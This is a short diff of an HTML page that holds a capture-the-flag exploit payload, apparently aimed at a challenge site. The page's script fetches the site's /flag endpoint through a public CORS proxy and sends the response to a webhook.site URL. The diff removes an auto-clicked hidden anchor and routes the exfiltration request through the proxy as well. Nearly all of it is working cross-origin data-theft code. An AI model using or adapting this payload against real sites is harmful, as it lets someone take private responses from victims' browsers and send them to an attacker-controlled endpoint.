@@ -1,13 +1,9 @@
 <html>
-<a id='evilAnchor' href='https://upcredit4.chall.malicecyber.com/flag'></a>
  <script>
   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'https://cors-anywhere.herokuapp.com/https://upcredit4.chall.malicecyber.com/flag', false);
   xhr.send();
   var xhr2 = new XMLHttpRequest();
-  xhr2.open('GET', 'https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644?flag=' + xhr.response);
-  setTimeout(() => { 
-   document.getElementById('evilAnchor').click();
-  }, 1000);
+  xhr2.open('GET', 'https://cors-anywhere.herokuapp.com/https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644?flag=' + xhr.response);
  </script>
  </html>
